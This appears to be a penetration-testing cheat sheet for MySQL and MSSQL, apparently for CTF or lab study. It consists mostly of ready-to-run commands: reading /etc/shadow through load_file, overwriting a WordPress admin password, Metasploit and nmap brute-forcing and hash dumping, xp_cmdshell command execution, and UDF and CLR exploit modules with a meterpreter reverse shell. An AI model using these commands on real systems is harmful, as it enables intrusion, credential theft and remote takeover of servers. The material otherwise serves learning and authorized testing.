# SQL

**MySQL**  
**Description**: MySQL is an open-source relational database management system - it can expose critical data or remote access if misconfigured or weakly protected
**Ports**: TCP 3306 
**Known Vulnerabilities**: Default/empty passwords, SQL Injection, privilege escalation via UDF (User-Defined Functions), outdated server versions with RCE flaws

<br>

# Basic SQL Commands

```shell
mysql -u <user> -p -h <target_IP> # root
# Connects to a remote MySQL server using the specified username and prompts for a password.

# Inside MySQL prompt
show databases;
use <database_name>;
show tables;
select * from <table_name>;

# Read system files if possible
select load_file('/etc/shadow');

# Change WordPress admin password (example)
UPDATE wp_users SET user_pass = MD5('password123') WHERE user_login = 'admin';
# Then access
http://<target_IP>:<port>/wordpress/wp-admin
```

<br>

# Enumeration with Metasploit Modules

**MySQL**

```shell
use auxiliary/scanner/mysql/mysql_version # Identify MySQL version
use auxiliary/scanner/mysql/mysql_login # Brute-force MySQL credentials. Username is root
use auxiliary/admin/mysql/mysql_enum # Enumerate users, databases
use auxiliary/admin/mysql/mysql_sql # Run custom SQL queries (needs valid creds)
use auxiliary/scanner/mysql/mysql_hashdump # Dump password hashes
use auxiliary/scanner/mysql/mysql_schemadump # Dump full database schema
use auxiliary/scanner/mysql/mysql_file_enum # Find readable files
use auxiliary/scanner/mysql/mysql_writable_dirs # Find writable directories
```

**MSSQL**

```shell
use auxiliary/scanner/mssql/mssql_login # MSSQL brute-force
use auxiliary/admin/mssql/mssql_enum # Enumerate server, db info
use auxiliary/admin/mssql/mssql_enum_sql_logins # List SQL users
use auxiliary/admin/mssql/mssql_exec # Run OS commands via xp_cmdshell
use auxiliary/admin/mssql/mssql_enum_domain_accounts # Map domain accounts
```

<br>

# Enumeration with Nmap

**MySQL Nmap Scripts**

```shell
nmap --script mysql-empty-password -p 3306 <target_IP>
# Checks if the MySQL server allows login with an empty password.

nmap --script mysql-info -p 3306 <target_IP>
# Retrieves MySQL server version and basic configuration info.

nmap --script mysql-users --script-args="mysqluser=root,mysqlpass=''" -p 3306 <target_IP>
# Attempts to enumerate MySQL user accounts using provided credentials.

nmap --script mysql-databases --script-args="mysqluser=root,mysqlpass=''" -p 3306 <target_IP>
# Lists databases accessible with the provided MySQL credentials.

nmap --script mysql-variables --script-args="mysqluser=root,mysqlpass=''" -p 3306 <target_IP>
# Retrieves global system variables from the MySQL server.

nmap --script mysql-dump-hashes --script-args="username=root,password=''" -p 3306 <target_IP>
# Dumps MySQL user password hashes using provided credentials.

nmap --script mysql-query --script-args="query='SELECT count(*) FROM books.authors;',username=root,password=''" -p 3306 <target_IP>
# Executes a custom SQL query on the remote MySQL server.

```

**MSSQL Nmap Scripts**

```shell
nmap --script ms-sql-info -p 1433 <target_IP>
# Gathers information about the Microsoft SQL Server, including version and configuration.

nmap --script ms-sql-ntlm-info --script-args mssql.instance-port=1433 <target_IP>
# Extracts NTLM information from the SQL Server for fingerprinting and domain details.

nmap --script ms-sql-brute --script-args userdb=<user_list>,passdb=<pass_list> -p 1433 <target_IP>
# Performs brute-force attack on MS-SQL Server using provided username and password lists.

nmap --script ms-sql-query --script-args="mssql.username=admin,mssql.password=pass,ms-sql-query.query='SELECT * FROM master..syslogins'" -p 1433 <target_IP>
# Executes a custom SQL query on the target SQL Server using given credentials.

nmap --script ms-sql-xp-cmdshell --script-args="mssql.username=admin,mssql.password=pass,ms-sql-xp-cmdshell.cmd='ipconfig'" -p 1433 <target_IP>
# Runs a Windows system command on the SQL Server via xp_cmdshell stored procedure.

nmap --script ms-sql-xp-cmdshell --script-args="mssql.username=admin,mssql.password=pass,ms-sql-xp-cmdshell.cmd='type c:\flag.txt'" -p 1433 <target_IP>
# Uses xp_cmdshell to read the contents of a file on the SQL Server (e.g., for CTF flags).

```

<br>

# Exploitation

**MySQL Exploitation**

```shell
use exploit/multi/mysql/mysql_udf_payload
# Exploits MySQL by uploading a malicious UDF (User Defined Function) to achieve remote code execution.
# Requires valid MySQL credentials and file write permissions.
set FORCE_UDF_UPLOAD true
set target 1 # 1 = Linux target
```

**MSSQL Exploitation**

```shell
# If xp_cmdshell is enabled
use auxiliary/admin/mssql/mssql_exec
# Executes a system command on the SQL Server using xp_cmdshell.
set CMD ipconfig

use exploit/windows/mssql/mssql_clr_payload # related to MSSQL 2012
# Uses a custom CLR assembly to gain code execution on the SQL Server.
set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Dump hashes from MSSQL
use auxiliary/admin/mssql/mssql_enum_sql_logins
# Enumerates SQL Server logins and password hashes.

use auxiliary/admin/mssql/mssql_enum_domain_accounts
# Lists domain accounts the SQL Server can see or interact with.

use auxiliary/admin/mssql/mssql_sql
# Executes arbitrary SQL queries on the SQL Server.
```
